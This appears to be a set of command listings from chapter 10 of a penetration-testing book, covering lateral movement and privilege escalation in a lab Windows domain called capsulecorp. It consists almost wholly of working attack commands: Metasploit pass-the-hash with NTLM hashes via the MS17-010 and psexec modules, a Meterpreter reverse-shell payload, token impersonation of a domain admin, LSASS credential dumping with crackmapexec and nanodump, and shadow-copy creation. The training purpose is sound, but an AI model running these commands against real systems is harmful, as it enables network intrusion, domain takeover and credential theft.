# Chapter 10 Instructions

### Listing 10.1 Output of the net group command

```
run this on the raditz machine
net group "Domain Admins" /domain 
```

```
Use auxiliary/admin/smb/ms17_010_command
set rhosts 10.0.10.204
set smbdomain .
set smbuser Administrator
set smbpass aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72
set threads 10
set command qwinsta
set verbose false
run
```

### Listing 10.3 Opening a new Meterpreter session on 10.0.10.207

```
use exploit/windows/smb/psexec
set rhosts 10.0.10.208
set smbdomain .
set smbuser Administrator
set smbpass aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72
set payload windows/x64/meterpreter/reverse_winhttps
exploit
```

### Listing 10.4 Listing available tokens with Incognito

```
load incognito
list_tokens -u
```

### Listing 10.5 Impersonating the domain admin account

```
impersonate_token capsulecorp\serveradmin
```

### Listing 10.6 Harvesting the clear-text password using Mimikatz

```
crackmapexec smb 10.0.10.207 --local-auth -u administrator -H aad3b435b51404eeaad3b435b51404ee:0e17e3e87e6750e503dc2d023f58032e -M nanodump
```

### Listing 10.7 Locating the domain controller’s IP address

```
cme smb 10.0.10.207 --local-auth -u administrator -H aad3b435b51404eeaad3b435b51404ee:0e17e3e87e6750e503dc2d023f58032e -x "cmd /c ping capsulecorp.local"
```

### Listing 10.8 Checking for an existing VSC

```
cme smb 10.0.10.200 -u serveradmin -p 'S3cr3tPa$$!' -x 'vssadmin list shadows'
```

### Listing 10.9 Creating a new VSC

```
vssadmin create shadow /for=C:
```
